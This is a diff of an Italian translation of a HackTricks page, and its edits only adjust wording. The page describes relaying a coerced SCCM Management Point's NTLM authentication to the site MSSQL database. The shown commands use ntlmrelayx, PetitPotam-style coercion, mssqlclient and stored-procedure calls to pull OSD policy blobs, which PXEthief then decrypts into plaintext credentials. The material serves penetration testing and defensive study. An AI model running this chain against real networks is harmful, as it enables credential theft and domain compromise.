@@ -3,13 +3,13 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Costringendo un **System Center Configuration Manager (SCCM) Management Point (MP)** ad autenticarsi tramite SMB/RPC e **rilasciando** quel conto macchina NTLM al **database del sito (MSSQL)** si ottengono diritti `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Questi ruoli ti consentono di chiamare un insieme di procedure memorizzate che espongono i blob delle politiche di **Operating System Deployment (OSD)** (credenziali dell'Account di Accesso alla Rete, variabili della Sequenza di Attività, ecc.). I blob sono codificati/encriptati in esadecimale ma possono essere decodificati e decrittografati con **PXEthief**, restituendo segreti in chiaro.
+Costringendo un **Punto di Gestione (MP) di System Center Configuration Manager (SCCM)** ad autenticarsi tramite SMB/RPC e **rilasciando** quel conto macchina NTLM al **database del sito (MSSQL)** si ottengono diritti `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Questi ruoli ti consentono di chiamare un insieme di procedure memorizzate che espongono i blob delle politiche di **Distribuzione del Sistema Operativo (OSD)** (credenziali dell'Account di Accesso alla Rete, variabili della Sequenza di Attività, ecc.). I blob sono codificati/encriptati in esadecimale ma possono essere decodificati e decrittografati con **PXEthief**, rivelando segreti in chiaro.
 
 Catena ad alto livello:
 1. Scoprire MP & DB del sito ↦ endpoint HTTP non autenticato `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Avviare `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
 3. Costringere MP utilizzando **PetitPotam**, PrinterBug, DFSCoerce, ecc.
-4. Attraverso il proxy SOCKS connettersi con `mssqlclient.py -windows-auth` come conto **<DOMAIN>\\<MP-host>$** rilasciato.
+4. Attraverso il proxy SOCKS connettersi con `mssqlclient.py -windows-auth` come l'account rilasciato **<DOMAIN>\\<MP-host>$**.
 5. Eseguire:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
@@ -25,7 +25,7 @@ L'estensione ISAPI MP **GetAuth.dll** espone diversi parametri che non richiedon
 
 | Parametro | Scopo |
 |-----------|-------|
-| `MPKEYINFORMATIONMEDIA` | Restituisce la chiave pubblica del certificato di firma del sito + GUID dei dispositivi **All Unknown Computers** *x86* / *x64*. |
+| `MPKEYINFORMATIONMEDIA` | Restituisce la chiave pubblica del certificato di firma del sito + GUID dei dispositivi **Tutti i Computer Sconosciuti** *x86* / *x64*. |
 | `MPLIST` | Elenca ogni Punto di Gestione nel sito. |
 | `SITESIGNCERT` | Restituisce il certificato di firma del Sito Primario (identifica il server del sito senza LDAP). |
 
@@ -58,14 +58,14 @@ proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
 Passa al DB **CM_<SiteCode>** (usa il codice sito di 3 cifre, ad esempio `CM_001`).
 
-### 3.1  Trova GUID di Computer Sconosciuti (opzionale)
+### 3.1 Trova GUID di Computer Sconosciuti (opzionale)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2 Elenca le politiche assegnate
+### 3.2  Elenca le politiche assegnate
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
@@ -77,7 +77,7 @@ Concentrati sulle politiche:
 * **CollectionSettings** – può contenere account di esecuzione
 
 ### 3.3  Recupera il corpo completo
-Se hai già `PolicyID` e `PolicyVersion`, puoi saltare il requisito clientID utilizzando:
+Se hai già `PolicyID` e `PolicyVersion`, puoi saltare il requisito del clientID usando:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
@@ -149,7 +149,7 @@ abusing-ad-mssql.md
 
 
 ## Riferimenti
-- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+- [Vorrei parlare con il tuo manager: Rubare segreti con i Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
-- [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [Gestore di Misconfigurazioni – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
 {{#include ../../banners/hacktricks-training.md}}
